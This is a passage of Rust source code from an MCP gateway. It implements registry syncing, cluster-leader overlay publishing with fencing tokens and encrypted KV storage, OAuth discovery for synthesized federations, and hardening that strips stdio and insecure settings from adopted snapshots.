//! MCP Registry sync — auto-federating a registry's servers.
//!
//! A background syncer crawls each `mcp.registries[]` endpoint,
//! synthesizes one `FederationConfig` per usable server, and publishes
//! the set as the **registry overlay**. The overlay is composed onto
//! the base config inside the reload pipeline (`app::reload`), so every
//! reload trigger — file, SIGHUP, CP push, or a registry delta — passes
//! through the same merge, validation, atomic swap, satellite carry,
//! and `list_changed` client broadcast. Operator-authored federations
//! always win on a name/prefix collision.

pub(crate) mod client;
pub(crate) mod map;

use std::collections::{BTreeMap, HashSet};
use std::sync::Arc;
use std::time::Duration;

use crate::app::AppState;
use crate::config::AppConfig;
use crate::config::federation::{AuthMode, FederationConfig};
use crate::config::registry::{McpRegistryConfig, RegistryAuthMode};
use mcpg_mcp_client::auth::{
    CredentialFlow, DiscoveredOauth, GRANT_PROFILE_ID_JAG, GRANT_TYPE_JWT_BEARER, IdJagSupport,
};

use client::{EntryStatus, RegistryClient};
use map::{SkipReason, federation_for_entry};

/// Scheduler granularity; each registry syncs on its own
/// `sync.interval_secs` cadence on top of this tick.
const TICK: Duration = Duration::from_secs(15);

/// Federations synthesized from `mcp.registries`, composed onto every
/// reload's config. Empty until the first successful sync.
#[derive(Debug, Default, Clone, PartialEq)]
pub struct RegistryOverlay {
    pub federations: Vec<FederationConfig>,
    /// The registry each federation was synthesized from, by federation
    /// name. A federation's name alone cannot say: registry names may
    /// contain `-`, so `a---srv` starts with both `a--` and `a---`.
    pub owners: BTreeMap<String, String>,
}

impl RegistryOverlay {
    /// Add `federation`, synthesized from the registry named `registry`.
    pub(crate) fn push(&mut self, registry: &str, federation: FederationConfig) {
        self.owners
            .insert(federation.name.clone(), registry.to_owned());
        self.federations.push(federation);
    }
}

/// Compose the registry overlay onto a base config: append synthesized
/// federations that collide with nothing, each under the governance its
/// registry declares in `base`, then re-validate the merged whole. `None`
/// = nothing to change (empty overlay, everything collided or unclaimed,
/// or the merge failed validation — the base applies alone).
pub(crate) fn merged_with_overlay(
    base: &AppConfig,
    overlay: &RegistryOverlay,
) -> Option<AppConfig> {
    if overlay.federations.is_empty() {
        return None;
    }
    let mut merged = base.clone();
    let mut names: HashSet<String> = merged
        .mcp
        .federations
        .iter()
        .map(|f| f.name.clone())
        .collect();
    let mut prefixes: HashSet<String> = merged
        .mcp
        .federations
        .iter()
        .map(|f| f.tool_prefix().to_owned())
        .filter(|p| !p.is_empty())
        .collect();
    let mut appended = 0usize;
    for fed in &overlay.federations {
        let Some(governance) = synthesized_federation_governance(base, overlay, &fed.name) else {
            tracing::warn!(
                federation = %fed.name,
                registry = overlay.owners.get(&fed.name).map(String::as_str).unwrap_or(""),
                "registry overlay entry names no registry this config declares; not federated"
            );
            continue;
        };
        let prefix = fed.tool_prefix().to_owned();
        if names.contains(&fed.name) || prefixes.contains(&prefix) {
            tracing::warn!(
                federation = %fed.name,
                "registry overlay entry collides with an existing federation; operator config wins"
            );
            continue;
        }
        names.insert(fed.name.clone());
        prefixes.insert(prefix);
        let mut fed = fed.clone();
        fed.governance = governance.clone();
        merged.mcp.federations.push(fed);
        appended += 1;
    }
    if appended == 0 {
        return None;
    }
    match merged.validate() {
        Ok(()) => Some(merged),
        Err(e) => {
            tracing::error!(
                error = %e,
                "merged registry overlay failed validation; applying base config without it"
            );
            None
        }
    }
}

/// The governance a registry-synthesized federation named `federation`
/// answers to: the `defaults.governance` that `base` declares for the
/// registry `overlay` records as its owner. The overlay was built under the
/// config in force when it was crawled, or on the cluster leader, so the
/// governance it carries may be looser than `base` asks for. `None` when the
/// overlay records no owner, or `base` declares no registry of that name.
pub(crate) fn synthesized_federation_governance<'a>(
    base: &'a AppConfig,
    overlay: &RegistryOverlay,
    federation: &str,
) -> Option<&'a crate::config::BackendGovernanceConfig> {
    let owner = overlay.owners.get(federation)?;
    base.mcp
        .registries
        .iter()
        .find(|registry| registry.name == *owner)
        .map(|registry| &registry.defaults.governance)
}

/// Cluster leadership role: in a clustered deployment exactly one
/// replica crawls the registries; the rest adopt its snapshot from the
/// coordinator KV.
const LEADER_ROLE: &str = "gateway.registry_sync";
/// Coordinator-KV key holding the leader's published overlay snapshot.
const OVERLAY_KV_KEY: &str = "registry_sync/overlay";

/// The KV-published overlay envelope. `v` guards against a peer on an
/// incompatible snapshot layout applying garbage. `fence` is the
/// publishing leader's `ActiveLease` fencing token: the high-water
/// mark travels inside the envelope itself, and every adopter (and
/// the next leader, before overwriting) rejects an envelope whose
/// token is below the highest it has seen — a deposed leader that
/// still thinks it leads cannot publish stale state over a successor's.
#[derive(serde::Serialize, serde::Deserialize)]
struct OverlaySnapshot {
    v: u32,
    /// Publishing leader's fencing token. Defaulted so an envelope
    /// written before tokens were stamped decodes as 0 (never
    /// preferred over a stamped one).
    #[serde(default)]
    fence: u64,
    federations: Vec<FederationConfig>,
    /// `None` on an envelope from a leader that records no owners.
    #[serde(default)]
    owners: Option<BTreeMap<String, String>>,
}

const OVERLAY_SNAPSHOT_V: u32 = 1;

fn encode_overlay_snapshot(overlay: &RegistryOverlay, fence: u64) -> Option<Vec<u8>> {
    serde_json::to_vec(&OverlaySnapshot {
        v: OVERLAY_SNAPSHOT_V,
        fence,
        federations: overlay.federations.clone(),
        owners: Some(overlay.owners.clone()),
    })
    .ok()
}

/// Decode → `(overlay, publisher's fencing token)`. `registries` are the ones
/// this replica declares; they name the owners of an envelope that records
/// none.
fn decode_overlay_snapshot(
    bytes: &[u8],
    registries: &[McpRegistryConfig],
) -> Option<(RegistryOverlay, u64)> {
    let snap: OverlaySnapshot = serde_json::from_slice(bytes).ok()?;
    if snap.v != OVERLAY_SNAPSHOT_V {
        return None;
    }
    let federations: Vec<FederationConfig> = snap
        .federations
        .into_iter()
        // `tunnel://` needs no safety opt-in, so clamping the flags is not
        // enough — the scheme itself has to go.
        .filter(|f| !f.upstream.url.starts_with("tunnel://"))
        .map(clamp_adopted)
        .collect();
    let mut owners = match snap.owners {
        Some(owners) => owners,
        // A leader that predates the record still publishes during a rolling
        // upgrade; its followers claim by name, and so does this one, so the
        // registry's federations keep serving until a newer leader republishes.
        None => federations
            .iter()
            .filter_map(|f| {
                registry_named_by(registries, &f.name).map(|owner| (f.name.clone(), owner))
            })
            .collect(),
    };
    owners.retain(|name, _| federations.iter().any(|f| f.name == *name));
    Some((
        RegistryOverlay {
            federations,
            owners,
        },
        snap.fence,
    ))
}

/// The one registry in `registries` whose `<registry>--` prefix `federation`
/// starts with. `None` when none does, or more than one: registry names may
/// contain `-`, so `a---srv` starts with both `a--` and `a---`.
fn registry_named_by(registries: &[McpRegistryConfig], federation: &str) -> Option<String> {
    let mut claimants = registries
        .iter()
        .filter(|registry| federation.starts_with(&map::federation_name(&registry.name, "")));
    let registry = claimants.next()?;
    if claimants.next().is_some() {
        return None;
    }
    Some(registry.name.clone())
}

/// Re-assert the synthesis rails on a federation adopted from the
/// coordinator.
///
/// `federation_for_entry` hard-codes these when it builds a federation from
/// registry data, but an adopted snapshot arrives as an already-built
/// `FederationConfig` and never passes through it. The safety flags then
/// travel *inside* the adopted blob, so `validate()` is no barrier: a
/// snapshot declaring `allow_stdio: true` satisfies its own check and the
/// federation engine spawns the named process. An adopted snapshot must
/// never be more privileged than one this replica would have synthesized
/// itself, so the transport is forced back to streamable HTTP and the
/// escape hatches are cleared regardless of what the blob asked for.
fn clamp_adopted(mut fed: FederationConfig) -> FederationConfig {
    fed.upstream.transport = crate::config::UpstreamTransport::StreamableHttp;
    fed.upstream.command = None;
    fed.upstream.args = Vec::new();
    fed.upstream.env = Default::default();
    fed.upstream.upstream_safety.allow_stdio = false;
    fed.upstream.upstream_safety.allow_insecure_http = false;
    fed
}

/// The background syncer. One process-lifetime task; it reads the
/// current `mcp.registries` on every tick (so a config reload that
/// adds/removes registries needs no respawn) and keeps the last good
/// snapshot per registry across transient failures.
pub(crate) struct RegistrySyncer {
    state: AppState,
    /// Highest overlay fencing token this replica has seen (adopted or
    /// published). Adoption ignores envelopes below it, so a zombie
    /// ex-leader's stale publish cannot roll a follower back.
    overlay_fence_seen: std::sync::atomic::AtomicU64,
}

struct RegistryRun {
    /// Last successfully synthesized federations for this registry.
    federations: Vec<FederationConfig>,
    /// The merged entry set backing `federations` (tombstones dropped) —
    /// the base an incremental delta is merged onto.
    entries: Vec<client::RegistryEntry>,
    /// Max `updatedAt` observed; the `updated_since` incremental cursor.
    watermark: Option<String>,
    /// When the last FULL crawl ran (incremental deltas don't move it).
    last_full: tokio::time::Instant,
    /// Next sync due, measured on the tokio clock.
    next_due: tokio::time::Instant,
    /// Whether at least one crawl succeeded.
    synced_once: bool,
}

impl RegistrySyncer {
    pub(crate) fn spawn(state: AppState) {
        tokio::spawn(async move {
            Self {
                state,
                overlay_fence_seen: std::sync::atomic::AtomicU64::new(0),
            }
            .run()
            .await;
        });
    }

    /// The cluster backend when this deployment is clustered; `None` on
    /// single_node (run unconditionally, no KV traffic). Read per tick:
    /// a config reload rebuilds the runtime (and its coordinator), and a
    /// stale lease simply fails renewal and re-contends.
    fn leadership(&self) -> Option<Arc<dyn mcpg_cluster_api::ClusterBackend>> {
        if self.state.config.load().cluster.is_single_node() {
            return None;
        }
        self.state
            .runtime
            .load()
            .plugin_registry()
            .cluster_backend()
    }

    /// The overlay KV, wrapped exactly like every other capability store.
    ///
    /// `wrap_state_kv` is the authenticity control for cluster state: it
    /// AEAD-seals each value with the KV key as associated data and refuses
    /// plaintext reads. Reading the overlay off the raw coordinator KV made
    /// it the one capability store any writer to the shared keyspace could
    /// forge — which is the threat `cluster.state_encryption` exists to
    /// answer. The tenant prefix goes outermost so the AEAD binds the full
    /// key, matching the wrap order used at boot.
    fn overlay_kv(
        &self,
        backend: &Arc<dyn mcpg_cluster_api::ClusterBackend>,
    ) -> Option<Arc<dyn mcpg_cluster_api::KeyValueStore>> {
        let kv = backend.key_value_store()?;
        let config = self.state.config.load();
        let enc = match crate::app::build_state_cipher(&config.cluster) {
            Ok(enc) => enc,
            Err(e) => {
                tracing::error!(error = %e, "registry overlay state cipher unavailable; refusing KV access");
                return None;
            }
        };
        Some(crate::app::wrap_tenant_kv(
            crate::app::wrap_state_kv(kv, &enc),
            &config.cluster.tenant_segment,
        ))
    }

    /// Follower path: adopt the leader's overlay snapshot from the
    /// coordinator KV. Missing/undecodable snapshots keep the current
    /// overlay (fail-static).
    async fn adopt_kv_overlay(&self, backend: &Arc<dyn mcpg_cluster_api::ClusterBackend>) {
        // A deployment that configures no registries has opted out of this
        // feature; adopting a snapshot there would federate servers the
        // operator never asked for. The syncer itself is spawned
        // unconditionally, so the check belongs here rather than at spawn.
        let config = self.state.config.load_full();
        if config.mcp.registries.is_empty() {
            return;
        }
        let Some(kv) = self.overlay_kv(backend) else {
            return;
        };
        match kv.get(OVERLAY_KV_KEY).await {
            Ok(Some(entry)) => {
                let Some((overlay, fence)) =
                    decode_overlay_snapshot(&entry.bytes, &config.mcp.registries)
                else {
                    tracing::warn!("registry overlay KV snapshot is undecodable; keeping current");
                    return;
                };
                // Fencing: never adopt an envelope published under a
                // lower token than the highest already seen — it is a
                // deposed leader's stale state.
                let seen = self
                    .overlay_fence_seen
                    .load(std::sync::atomic::Ordering::Acquire);
                if fence < seen {
                    tracing::warn!(
                        fence,
                        highest_seen = seen,
                        "registry overlay snapshot carries a stale fencing token; ignoring"
                    );
                    return;
                }
                self.overlay_fence_seen
                    .fetch_max(fence, std::sync::atomic::Ordering::AcqRel);
                let current = self.state.registry_overlay.load_full();
                if *current == overlay {
                    return;
                }
                let federated = overlay.federations.len();
                self.state.registry_overlay.store(Arc::new(overlay));
                match crate::app::reapply_config(&self.state).await {
                    Ok(()) => {
                        tracing::info!(federated, "adopted registry overlay from cluster leader")
                    }
                    Err(e) => tracing::error!(
                        error = %e,
                        "adopted registry overlay failed to apply; previous config remains active"
                    ),
                }
            }
            Ok(None) => {}
            Err(e) => {
                tracing::warn!(error = %e, "registry overlay KV read failed");
            }
        }
    }

    /// Leader path: publish the overlay so followers (and the next
    /// leader, warm-starting) can adopt it without crawling. `fence`
    /// is this leader's `ActiveLease` fencing token; it rides inside
    /// the envelope and is the mark adopters compare against.
    async fn publish_kv_overlay(
        &self,
        backend: &Arc<dyn mcpg_cluster_api::ClusterBackend>,
        overlay: &RegistryOverlay,
        fence: u64,
    ) {
        let Some(kv) = self.overlay_kv(backend) else {
            return;
        };
        // A deposed leader still draining a crawl must not overwrite its
        // successor's snapshot: read the stored envelope first and stand
        // down when it carries a higher token. (Read-then-put, so a
        // racing successor can still be overwritten in a narrow window —
        // adopters' own compare-on-adopt is what makes that overwrite
        // inert.)
        match kv.get(OVERLAY_KV_KEY).await {
            Ok(Some(entry)) => {
                if let Some((_, stored_fence)) = decode_overlay_snapshot(&entry.bytes, &[])
                    && stored_fence > fence
                {
                    tracing::warn!(
                        fence,
                        stored_fence,
                        "registry overlay already published under a newer leadership; not overwriting"
                    );
                    return;
                }
            }
            Ok(None) => {}
            Err(e) => {
                tracing::warn!(error = %e, "registry overlay KV pre-publish read failed");
            }
        }
        let Some(bytes) = encode_overlay_snapshot(overlay, fence) else {
            return;
        };
        if let Err(e) = kv.put(OVERLAY_KV_KEY, bytes.into(), None).await {
            tracing::warn!(error = %e, "registry overlay KV publish failed");
        } else {
            self.overlay_fence_seen
                .fetch_max(fence, std::sync::atomic::Ordering::AcqRel);
        }
    }

    async fn run(self) {
        // Desynchronize replicas: each instance starts its cadence at a
        // random offset so a fleet doesn't stampede the registry.
        let jitter = Duration::from_secs(u64::from(uuid::Uuid::new_v4().as_bytes()[0] % 30));
        tokio::time::sleep(jitter).await;

        // Warm start: adopt any published snapshot before the first
        // crawl so a rebooted replica serves registry federations
        // immediately (and a registry outage at boot is bridged).
        if let Some(backend) = self.leadership() {
            self.adopt_kv_overlay(&backend).await;
        }

        let mut runs: BTreeMap<String, RegistryRun> = BTreeMap::new();
        let mut lease: Option<mcpg_cluster_api::BoxActiveLease> = None;
        let lease_ttl = TICK.saturating_mul(3).max(Duration::from_secs(30));
        let mut tick = tokio::time::interval(TICK);
        tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
        loop {
            tick.tick().await;
            let config = self.state.config.load_full();
            let registries = &config.mcp.registries;

            // Clustered: only the leader crawls; followers adopt the
            // leader's snapshot from the coordinator KV.
            let leadership = self.leadership();
            if let Some(backend) = &leadership
                && !crate::runtime::reaper_leadership::maintain_leadership(
                    LEADER_ROLE,
                    backend.as_ref(),
                    lease_ttl,
                    &mut lease,
                )
                .await
            {
                // A follower's local crawl state is stale by definition —
                // drop it so a later leadership win starts fresh.
                runs.clear();
                self.adopt_kv_overlay(backend).await;
                continue;
            }

            // Registries removed from config drop their snapshots (their
            // federations leave the overlay below).
            let configured: HashSet<&str> = registries.iter().map(|r| r.name.as_str()).collect();
            runs.retain(|name, _| configured.contains(name.as_str()));

            let mut changed = false;
            for registry in registries {
                let now = tokio::time::Instant::now();
                let due = runs
                    .get(&registry.name)
                    .map(|r| r.next_due <= now)
                    .unwrap_or(true);
                if !due {
                    continue;
                }
                let interval = Duration::from_secs(registry.sync.interval_secs);
                let run = runs.get(&registry.name);
                // Previous snapshot: OAuth discovery falls back to it on
                // a transient metadata outage.
                let prior: Vec<FederationConfig> =
                    run.map(|r| r.federations.clone()).unwrap_or_default();
                // Incremental crawl once a watermark exists, until the
                // periodic full-resync backstop comes due.
                let full_every =
                    Duration::from_secs(registry.sync.full_resync_hours.saturating_mul(3600));
                let incremental: Option<(Vec<client::RegistryEntry>, String)> =
                    if registry.sync.incremental {
                        run.filter(|r| r.synced_once && r.last_full.elapsed() < full_every)
                            .and_then(|r| r.watermark.clone().map(|w| (r.entries.clone(), w)))
                    } else {
                        None
                    };
                let was_incremental = incremental.is_some();
                let sync_result = match resolve_cred_bearer(&self.state, registry).await {
                    Ok(bearer) => {
                        sync_registry(
                            registry,
                            bearer,
                            &prior,
                            incremental
                                .as_ref()
                                .map(|(entries, since)| (entries.as_slice(), since.as_str())),
                        )
                        .await
                    }
                    Err(e) => Err(e),
                };
                match sync_result {
                    Ok(outcome) => {
                        metrics::counter!(
                            "mcpg_registry_sync_total",
                            "registry" => registry.name.clone(), "outcome" => "ok"
                        )
                        .increment(1);
                        metrics::gauge!(
                            "mcpg_registry_servers_federated",
                            "registry" => registry.name.clone()
                        )
                        .set(outcome.federations.len() as f64);
                        let entry = runs.entry(registry.name.clone()).or_insert(RegistryRun {
                            federations: Vec::new(),
                            entries: Vec::new(),
                            watermark: None,
                            last_full: now,
                            next_due: now,
                            synced_once: false,
                        });
                        if entry.federations != outcome.federations || !entry.synced_once {
                            changed = true;
                        }
                        entry.federations = outcome.federations;
                        entry.entries = outcome.entries;
                        if outcome.watermark.is_some() {
                            entry.watermark = outcome.watermark;
                        }
                        if !was_incremental {
                            entry.last_full = now;
                        }
                        entry.synced_once = true;
                        entry.next_due = now + interval;
                    }
                    Err(e) => {
                        // Keep the last snapshot — a flaky registry must
                        // not drop working federations.
                        metrics::counter!(
                            "mcpg_registry_sync_total",
                            "registry" => registry.name.clone(), "outcome" => "error"
                        )
                        .increment(1);
                        tracing::warn!(
                            registry = %registry.name, error = %e,
                            "registry sync failed; keeping the previous snapshot"
                        );
                        let entry = runs.entry(registry.name.clone()).or_insert(RegistryRun {
                            federations: Vec::new(),
                            entries: Vec::new(),
                            watermark: None,
                            last_full: now,
                            next_due: now,
                            synced_once: false,
                        });
                        entry.next_due = now + interval;
                    }
                }
            }

            let overlay = assemble_overlay(registries, &runs);
            let current = self.state.registry_overlay.load_full();
            if *current != overlay {
                changed = true;
            }
            if changed && *current != overlay {
                let federated = overlay.federations.len();
                self.state.registry_overlay.store(Arc::new(overlay.clone()));
                match crate::app::reapply_config(&self.state).await {
                    Ok(()) => tracing::info!(
                        federated,
                        "registry overlay applied; federated capabilities republished"
                    ),
                    Err(e) => tracing::error!(
                        error = %e,
                        "registry overlay reapply failed; previous config remains active"
                    ),
                }
                if let Some(backend) = &leadership {
                    let fence = lease.as_ref().map_or(0, |l| l.fencing_token());
                    self.publish_kv_overlay(backend, &overlay, fence).await;
                }
            }
        }
    }
}

/// Resolve the registry bearer for auth mode `cred`: mint (host-cached)
/// a token from the referenced credential-issuer plugin under the
/// gateway's machine identity — the crawl is a gateway-as-itself read,
/// not on behalf of any caller. `None` for every other auth mode.
async fn resolve_cred_bearer(
    state: &AppState,
    registry: &McpRegistryConfig,
) -> Result<Option<String>, client::RegistryError> {
    if registry.auth.mode != RegistryAuthMode::Cred {
        return Ok(None);
    }
    let uri = registry.auth.credential.as_deref().unwrap_or_default();
    let (plugin_id, target) = uri
        .strip_prefix("cred://")
        .and_then(|rest| rest.split_once('/'))
        .ok_or_else(|| {
            client::RegistryError::Connect(format!(
                "auth.credential {uri:?} must be cred://<plugin_id>/<target>"
            ))
        })?;
    let runtime = state.runtime.load_full();
    let issuer = runtime
        .plugin_registry()
        .credential_issuer(plugin_id)
        .ok_or_else(|| {
            client::RegistryError::Connect(format!("no credential_issuer plugin id={plugin_id:?}"))
        })?;
    let issued = runtime
        .credential_cache
        .get_or_issue(
            &issuer,
            &crate::runtime::federation::engine::machine_identity(),
            target,
            &serde_json::Value::Null,
        )
        .await
        .map_err(|e| {
            client::RegistryError::Connect(format!("registry credential issue failed: {e}"))
        })?;
    issued
        .value
        .filter(|v| !v.is_empty())
        .map(Some)
        .ok_or_else(|| {
            client::RegistryError::Connect("credential issuer returned no token value".to_owned())
        })
}

/// Plugin id of the ID-JAG credential issuer.
const ID_JAG_ISSUER: &str = "dev.mcpg.credential.oauth-id-jag";

/// Why OAuth discovery left a server unfederated.
#[derive(Debug, Clone, PartialEq, Eq)]
enum DiscoverySkip {
    /// The metadata chain failed and no earlier snapshot exists.
    Failed(String),
    /// The federation redeems ID-JAGs, but its authorization server's
    /// metadata does not offer the jwt-bearer grant.
    NoIdJagSupport { issuer: String },
}

impl DiscoverySkip {
    fn label(&self) -> &'static str {
        match self {
            Self::Failed(_) => "oauth_discovery",
            Self::NoIdJagSupport { .. } => "no_id_jag_support",
        }
    }
}

impl std::fmt::Display for DiscoverySkip {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Failed(e) => f.write_str(e),
            Self::NoIdJagSupport { issuer } => write!(
                f,
                "authorization server {issuer:?} does not advertise ID-JAG redemption \
                 (the {GRANT_PROFILE_ID_JAG} grant profile or the {GRANT_TYPE_JWT_BEARER} grant)"
            ),
        }
    }
}

/// What the discovered `audience` has to name for this federation's
/// credential issuer.
fn credential_flow(fed: &FederationConfig) -> CredentialFlow {
    let plugin = fed
        .upstream
        .auth
        .credential
        .as_deref()
        .and_then(|uri| uri.strip_prefix("cred://"))
        .and_then(|rest| rest.split_once('/'))
        .map(|(plugin, _)| plugin);
    if plugin == Some(ID_JAG_ISSUER) {
        CredentialFlow::IdJag
    } else {
        CredentialFlow::Direct
    }
}

/// Populate `auth.credential_config` from RFC 9728/8414 discovery when
/// the registry opts in and the federation uses an OAuth credential
/// mode without an explicit per-call config. Falls back to the previous
/// snapshot's discovered config on a transient metadata failure; errors
/// only when nothing was ever discovered for this server.
async fn apply_oauth_discovery(
    registry: &McpRegistryConfig,
    fed: &mut FederationConfig,
    prior: &[FederationConfig],
) -> Result<(), DiscoverySkip> {
    if !registry.defaults.oauth_discovery.enabled
        || !matches!(
            fed.upstream.auth.mode,
            AuthMode::OauthClientCredentials | AuthMode::OauthImpersonation
        )
        || fed.upstream.auth.credential_config.is_some()
    {
        return Ok(());
    }
    let policy = mcpg_mcp_client::auth::DiscoveryPolicy {
        allow_private: registry.defaults.upstream_safety.allow_private_backends,
        // Registry upstreams are TLS-only by construction; discovery
        // keeps the same posture.
        allow_insecure_http: false,
    };
    let outcome = mcpg_mcp_client::auth::discover_oauth(&fed.upstream.url, policy).await;
    apply_discovered(&registry.name, fed, outcome, prior)
}

/// Write a discovery outcome onto `fed`. An AS that does not offer ID-JAG
/// redemption is an answer from a reachable AS, not an outage, so it never
/// falls back to the prior snapshot.
fn apply_discovered(
    registry: &str,
    fed: &mut FederationConfig,
    outcome: Result<DiscoveredOauth, String>,
    prior: &[FederationConfig],
) -> Result<(), DiscoverySkip> {
    match outcome {
        Ok(discovered) => {
            let flow = credential_flow(fed);
            if flow == CredentialFlow::IdJag {
                match discovered.id_jag_support() {
                    IdJagSupport::Advertised => {}
                    IdJagSupport::JwtBearerOnly => {
                        metrics::counter!(
                            "mcpg_registry_oauth_discovery_warning_total",
                            "registry" => registry.to_owned(),
                            "reason" => "id_jag_profile_missing"
                        )
                        .increment(1);
                        tracing::warn!(
                            registry, federation = %fed.name, issuer = %discovered.issuer,
                            "authorization server offers the jwt-bearer grant without the \
                             id-jag grant profile; federating anyway"
                        );
                    }
                    IdJagSupport::Unsupported => {
                        return Err(DiscoverySkip::NoIdJagSupport {
                            issuer: discovered.issuer,
                        });
                    }
                }
            }
            fed.upstream.auth.credential_config = Some(discovered.into_call_config(flow));
            Ok(())
        }
        Err(e) => {
            if let Some(previous) = prior
                .iter()
                .find(|p| p.name == fed.name)
                .and_then(|p| p.upstream.auth.credential_config.clone())
            {
                tracing::warn!(
                    federation = %fed.name, error = %e,
                    "OAuth discovery failed; keeping previously discovered metadata"
                );
                fed.upstream.auth.credential_config = Some(previous);
                Ok(())
            } else {
                Err(DiscoverySkip::Failed(e))
            }
        }
    }
}

/// One successful crawl: the merged entry set (tombstones dropped — the
/// base for the next incremental delta), the synthesized federations,
/// and the advanced `updatedAt` watermark (when the registry publishes
/// timestamps).
struct CrawlOutcome {
    entries: Vec<client::RegistryEntry>,
    federations: Vec<FederationConfig>,
    watermark: Option<String>,
}

/// Merge an incremental delta onto the cached entry set: a delta entry
/// replaces its cached namesake (any status — a tombstone replaces a
/// live entry and is dropped after mapping).
fn merge_incremental(
    cached: &[client::RegistryEntry],
    delta: Vec<client::RegistryEntry>,
) -> Vec<client::RegistryEntry> {
    let changed: HashSet<&str> = delta.iter().map(|e| e.server.name.as_str()).collect();
    let mut merged: Vec<client::RegistryEntry> = cached
        .iter()
        .filter(|e| !changed.contains(e.server.name.as_str()))
        .cloned()
        .collect();
    merged.extend(delta);
    merged
}

/// Max `updatedAt` across `entries`. The registry publishes RFC 3339
/// UTC timestamps, which order lexicographically; the value is only
/// ever echoed back as an opaque `updated_since` cursor.
fn max_watermark(entries: &[client::RegistryEntry]) -> Option<String> {
    entries
        .iter()
        .filter_map(|e| e.updated_at.as_deref())
        .max()
        .map(str::to_owned)
}

/// Crawl one registry and synthesize its federation snapshot. With
/// `incremental = Some((cached, since))` only entries updated since the
/// watermark are fetched and merged onto the cached set; `None` lists
/// the registry in full.
async fn sync_registry(
    registry: &McpRegistryConfig,
    cred_bearer: Option<String>,
    prior: &[FederationConfig],
    incremental: Option<(&[client::RegistryEntry], &str)>,
) -> Result<CrawlOutcome, client::RegistryError> {
    let client = RegistryClient::connect(registry, cred_bearer).await?;
    let mut entries = match incremental {
        Some((cached, since)) => {
            let delta = client.list_since(since).await?;
            if !delta.is_empty() {
                tracing::debug!(
                    registry = %registry.name, changed = delta.len(),
                    "incremental registry crawl merged a delta"
                );
            }
            merge_incremental(cached, delta)
        }
        None => client.list_latest().await?,
    };

    // Version pins replace the latest entry for that server; a pinned
    // server the registry deleted stays deleted (the tombstone wins).
    for (server, over) in &registry.servers {
        let Some(version) = over.version.as_deref() else {
            continue;
        };
        let listed = entries.iter().position(|e| e.server.name == *server);
        let deleted = listed
            .map(|i| entries[i].status == EntryStatus::Deleted)
            .unwrap_or(false);
        if deleted {
            continue;
        }
        match client.get_version(server, version).await {
            Ok(mut pinned) => {
                // The pinned version federates even when it is not the
                // registry's latest.
                pinned.is_latest = true;
                match listed {
                    Some(i) => entries[i] = pinned,
                    None => entries.push(pinned),
                }
            }
            Err(e) => {
                tracing::warn!(
                    registry = %registry.name, server = %server, version = %version, error = %e,
                    "pinned registry version fetch failed; server skipped this sync"
                );
                if let Some(i) = listed {
                    entries.remove(i);
                }
            }
        }
    }

    entries.sort_by(|a, b| a.server.name.cmp(&b.server.name));
    entries.dedup_by(|a, b| a.server.name == b.server.name);

    let mut federations = Vec::new();
    let mut over_cap = 0usize;
    for entry in &entries {
        if federations.len() as u64 >= registry.sync.max_servers {
            over_cap += 1;
            continue;
        }
        match federation_for_entry(registry, entry) {
            Ok(mut fed) => {
                if let Err(skip) = apply_oauth_discovery(registry, &mut fed, prior).await {
                    metrics::counter!(
                        "mcpg_registry_server_skipped_total",
                        "registry" => registry.name.clone(), "reason" => skip.label()
                    )
                    .increment(1);
                    tracing::warn!(
                        registry = %registry.name, server = %entry.server.name,
                        reason = skip.label(), error = %skip,
                        "registry server not federated (OAuth discovery)"
                    );
                    continue;
                }
                if entry.status == EntryStatus::Deprecated {
                    tracing::warn!(
                        registry = %registry.name, server = %entry.server.name,
                        "federating a registry-deprecated server (on_deprecated: serve_and_warn)"
                    );
                    metrics::counter!(
                        "mcpg_registry_server_deprecated_total",
                        "registry" => registry.name.clone()
                    )
                    .increment(1);
                }
                federations.push(fed);
            }
            Err(reason) => {
                metrics::counter!(
                    "mcpg_registry_server_skipped_total",
                    "registry" => registry.name.clone(), "reason" => reason.label()
                )
                .increment(1);
                match &reason {
                    SkipReason::Deleted | SkipReason::Filtered => tracing::debug!(
                        registry = %registry.name, server = %entry.server.name,
                        reason = reason.label(), "registry server not federated"
                    ),
                    _ => tracing::info!(
                        registry = %registry.name, server = %entry.server.name,
                        reason = reason.label(), detail = ?reason,
                        "registry server not federated"
                    ),
                }
            }
        }
    }
    if over_cap > 0 {
        metrics::counter!(
            "mcpg_registry_server_skipped_total",
            "registry" => registry.name.clone(), "reason" => "over_cap"
        )
        .increment(over_cap as u64);
        tracing::warn!(
            registry = %registry.name, over_cap,
            limit = registry.sync.max_servers,
            "registry lists more servers than sync.max_servers; excess skipped (name-sorted)"
        );
    }
    let watermark = max_watermark(&entries);
    // Tombstones were reported by the mapping pass above; drop them from
    // the cached base so the incremental working set stays bounded.
    entries.retain(|e| e.status != EntryStatus::Deleted);
    Ok(CrawlOutcome {
        entries,
        federations,
        watermark,
    })
}

/// Concatenate per-registry snapshots (config order) into the overlay,
/// dropping cross-registry name/prefix duplicates — the first registry
/// listing a server wins.
fn assemble_overlay(
    registries: &[McpRegistryConfig],
    runs: &BTreeMap<String, RegistryRun>,
) -> RegistryOverlay {
    let mut overlay = RegistryOverlay::default();
    let mut names: HashSet<String> = HashSet::new();
    let mut prefixes: HashSet<String> = HashSet::new();
    for registry in registries {
        let Some(run) = runs.get(&registry.name) else {
            continue;
        };
        for fed in &run.federations {
            let prefix = fed.tool_prefix().to_owned();
            if names.contains(&fed.name) || prefixes.contains(&prefix) {
                tracing::warn!(
                    federation = %fed.name,
                    "server federated by an earlier registry; duplicate dropped"
                );
                continue;
            }
            names.insert(fed.name.clone());
            prefixes.insert(prefix);
            overlay.push(&registry.name, fed.clone());
        }
    }
    overlay
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Registry whose synthesized federations use an OAuth credential
    /// mode, with discovery toggled. The upstream resolves to a closed
    /// loopback port so discovery fails fast and deterministically.
    fn oauth_registry(discovery_enabled: bool) -> McpRegistryConfig {
        let cfg: McpRegistryConfig = serde_yaml::from_str(&format!(
            "name: acme\nurl: \"https://r.example\"\ndefaults:\n  upstream_safety: {{ allow_private_backends: true }}\n  oauth_discovery: {{ enabled: {discovery_enabled} }}\n  auth:\n    mode: oauth_impersonation\n    credential: \"cred://dev.mcpg.credential.oauth-id-jag/{{server}}\"\n"
        ))
        .expect("parse registry config");
        cfg.validate().expect("valid registry config");
        cfg
    }

    fn crm_fed(registry: &McpRegistryConfig) -> FederationConfig {
        let entry = client::RegistryEntry {
